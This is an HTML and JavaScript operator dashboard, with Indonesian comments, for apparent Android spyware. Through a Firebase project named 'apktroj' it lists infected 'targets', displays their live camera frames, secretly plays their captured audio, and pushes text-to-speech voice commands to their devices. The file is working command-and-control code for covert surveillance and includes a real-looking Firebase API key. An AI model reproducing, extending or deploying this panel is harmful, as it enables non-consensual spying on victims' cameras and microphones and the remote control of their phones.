<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R MONITORING CENTER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
        .border-neon { border: 1px solid #00ff41; box-shadow: 0 0 10px rgba(0,255,65,0.3); }
        .scanline { background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); background-size: 100% 2px, 3px 100%; pointer-events: none; }
    </style>
</head>
<body class="p-4">
    <div class="max-w-6xl mx-auto relative">
        <div class="scanline absolute inset-0 opacity-20"></div>
        
        <header class="border-b border-green-900 mb-6 pb-2 flex justify-between">
            <div>
                <h1 class="text-xl font-bold tracking-tighter text-red-600">C.R COMMAND CENTER V2.0</h1>
                <p id="status" class="text-[10px] text-green-700">AWAITING CONNECTION...</p>
            </div>
            <div class="text-right">
                <p id="clock" class="text-xs"></p>
            </div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
            <!-- Feed Area -->
            <div class="lg:col-span-3 space-y-4">
                <div class="border-neon bg-black p-4 aspect-video relative flex items-center justify-center overflow-hidden">
                    <img id="view-port" class="hidden w-full h-full object-contain">
                    <div id="no-signal" class="text-green-900 animate-pulse">NO INCOMING SIGNAL</div>
                    <div class="absolute top-2 left-2 text-[10px] bg-red-600 text-white px-2 py-1 font-bold">LIVE STREAM</div>
                </div>

                <!-- Hidden Audio untuk mendengar Target -->
                <audio id="target-listener" autoplay></audio>
            </div>

            <!-- Control Area -->
            <div class="space-y-4">
                <div class="border-neon p-4 bg-black">
                    <h2 class="text-xs font-bold mb-4 text-blue-500 uppercase">Send Voice (TTS)</h2>
                    <textarea id="voice-input" class="w-full h-24 bg-gray-900 border border-green-900 p-2 text-green-400 text-xs outline-none mb-3" placeholder="Tulis teks untuk dibacakan di perangkat target..."></textarea>
                    <button id="btn-send" class="w-full bg-red-900 hover:bg-red-700 text-white font-bold py-2 text-xs transition-all">SEND VOICE COMMAND</button>
                </div>

                <div class="border-neon p-4 bg-black">
                    <h2 class="text-xs font-bold mb-2 text-yellow-500 uppercase">Target List</h2>
                    <div id="target-list" class="text-[9px] space-y-1 overflow-y-auto max-h-40"></div>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";
        let lastAudioPlay = 0;

        async function init() {
            await signInAnonymously(auth);
            document.getElementById('status').innerText = "CONNECTED AS OPERATOR: " + auth.currentUser.uid;
            
            const bufferCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
            onSnapshot(bufferCol, (snap) => {
                const list = document.getElementById('target-list');
                list.innerHTML = "";
                
                snap.forEach(docSnap => {
                    const data = docSnap.data();
                    const targetId = docSnap.id.substring(0, 8);
                    list.innerHTML += `<div class="p-1 border border-green-900 bg-green-950">ID: ${targetId} | LIVE</div>`;
                    
                    // Visual Feed
                    if (data.frame) {
                        const port = document.getElementById('view-port');
                        port.src = data.frame;
                        port.classList.remove('hidden');
                        document.getElementById('no-signal').classList.add('hidden');
                    }

                    // Audio Feed (Mendengar Target)
                    if (data.audio && data.timestamp > lastAudioPlay) {
                        const audio = document.getElementById('target-listener');
                        audio.src = data.audio;
                        audio.play().catch(e => console.log("Klik layar untuk aktifkan suara"));
                        lastAudioPlay = data.timestamp;
                    }
                });
            });
        }

        document.getElementById('btn-send').onclick = async () => {
            const txt = document.getElementById('voice-input').value;
            if(!txt) return;
            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
                text: txt,
                timestamp: Date.now()
            });
            document.getElementById('voice-input').value = "";
            alert("Perintah Suara Dikirim");
        };

        setInterval(() => {
            document.getElementById('clock').innerText = new Date().toLocaleString();
        }, 1000);

        init();
    </script>
</body>
</html>
